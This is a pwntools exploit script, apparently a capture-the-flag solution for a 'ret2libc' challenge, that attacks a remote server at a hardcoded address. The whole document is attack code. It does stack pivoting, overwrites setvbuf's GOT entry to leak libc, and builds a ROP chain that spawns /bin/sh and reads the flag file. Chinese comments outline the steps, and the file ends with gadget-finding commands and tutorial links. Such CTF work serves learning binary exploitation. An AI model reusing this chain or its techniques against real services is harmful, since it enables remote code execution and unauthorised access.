#!/usr/bin/env python3
from pwn import *

# Learn from TwinkleStar03
# context.log_level = 'debug'

# p = process('./ret2libc')
p = remote('140.113.24.241', 30173)

main_address     = 0x4011b3       # main   + 19
leave_ret        = 0x40119e       # hackMe + 40
hackme_gadget    = 0x401182       # hackMe + 12 (lea    rax,[rbp-0x80])
read_got_address = 0x404020       # read@got
puts_plt_address = 0x401064       # puts@plt
pop_rbp_ret      = 0x40115d       # pop    rbp; ret

first_pivot_address   = 0x4040b0 + 0x80
setvbuf_pivot_address = 0x404028 + 0x80
stdin_pivot_address   = 0x404050 + 0x80

# (+ 0x80) since the gadget is { lea    rax,[rbp-0x80] }

# pause()

info(f'First Stage Pivoting to {hex(first_pivot_address)}')
p.sendline(b'A' * (128) + p64(first_pivot_address) + p64(hackme_gadget))
sleep(0.1)

# pause()
rop_chain = [
    p64(pop_rbp_ret),   # 0x4040b0
    p64(0x4040f0),      # rbp chain
    p64(leave_ret),
    b'A' * 8,
    p64(0x404130),      # Frame #2 Start
    p64(pop_rbp_ret),  
    p64(0x404140),      # rbp chain
    p64(leave_ret),     # Frame #2 End
    p64(stdin_pivot_address),      # rbp chain
    p64(hackme_gadget), # ret address
    p64(0x4040f0) * 5   # padding
]
p.send(b''.join(rop_chain).ljust(0x80, b'A') + p64(setvbuf_pivot_address) + p64(hackme_gadget) + p64(0x4041f0) + p64(main_address))
sleep(0.1)

# pause()
info(f'Overwrite setvbuf.GOT @ {hex(setvbuf_pivot_address)}')
p.send(p64(puts_plt_address))
sleep(0.3)

# pause()
info(f'Overwrite FILE * stdin')
p.send(p64(read_got_address))
sleep(0.3)

# back to main and leak
p.recvuntil(b'!\n')
libc_read = u64(p.recv(6).ljust(8, b'\x00'))
libc_base = libc_read - 0x0000000001147d0
success('Leaked libc base address: ' + hex(libc_base))
# success('Leaked libc read address: ' + hex(libc_read))

ret_addr    = libc_base + 0x029139
libc_system = libc_base + 0x050d70

# Make execve('/bin/sh', 0, 0)
libc_bin_sh = libc_base + 0x1d8678
pop_rax_ret = libc_base + 0x0000000000045eb0
pop_rdi_ret = libc_base + 0x000000000002a3e5
pop_rdx_r12_ret = libc_base + 0x000000000011f2e7
pop_rsi_ret = libc_base + 0x0000000000141d5e
syscall_ret = libc_base + 0x0000000000091316

payload = b''.join([
    b'A' * 0x88,
    p64(pop_rdi_ret),
    p64(libc_bin_sh),
    p64(pop_rax_ret),
    p64(0x3b),
    p64(pop_rsi_ret),
    p64(0),
    p64(pop_rdx_r12_ret),
    p64(0),
    p64(0),
    p64(syscall_ret)
])
p.sendline(payload)

# p.interactive()
p.sendline(b'cat flag.txt')
print(p.recv())

# 解題思路：
# 1. stack pivot to setvbuf 下面, 再跳回 hackMe
# 2. 將 ROP chain 寫入 step 1 動過的 stack, 再將 stack pivot to setvbuf
# 3. 修改 setvbuf.GOT  為 puts@plt
# 4. 修改 FILE * stdin 為 read@got （FILE * stdin 是 setvbuf 的第一個參數）
# 5. call setvbuf (puts) in main -> leak libc base address of read
# 6. 因為 stack 的 RBP, RSP chain 壞了，所以要 Make execve('/bin/sh', 0, 0) (system() 會檢查 stack)


# -------------------------------------
# useful commands:
# ldd ret2libc
# ROPgadget --binary ./ret2libc --only "pop|ret"
# ROPgadget --binary /lib/x86_64-linux-gnu/libc.so.6 --only "pop|ret"
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
# readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "exit"
# strings -a -t x /lib/x86_64-linux-gnu/libc.so.6 | grep "/bin/sh"

# ----- example ----- 
# https://tech-blog.cymetrics.io/posts/crystal/pwn-intro-2/

# ----- example -----
# https://valsamaras.medium.com/introduction-to-x64-binary-exploitation-part-2-return-into-libc-c325017f465